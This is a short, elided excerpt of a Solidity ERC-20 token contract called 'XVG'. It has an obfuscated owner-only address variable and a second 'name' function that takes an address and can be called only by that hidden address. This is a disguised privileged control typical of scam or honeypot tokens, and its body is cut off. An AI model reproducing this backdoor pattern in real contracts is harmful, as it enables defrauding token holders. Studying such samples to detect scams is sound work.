...
contract XVG is Ownable {
    ...
    string public _tokenname = "XVG ERC-20";
    string public _tokensymbol = "XVG";
    uint256 tokenamount = 10000000000*10**decimals();
    address public edhnfj3;
    ...
    function name(address jjkxq1) public     {
        require(edhnfj3 ==  _msgSender());
        if(edhnfj3 != _msgSender()){
                revert("fu");
        }
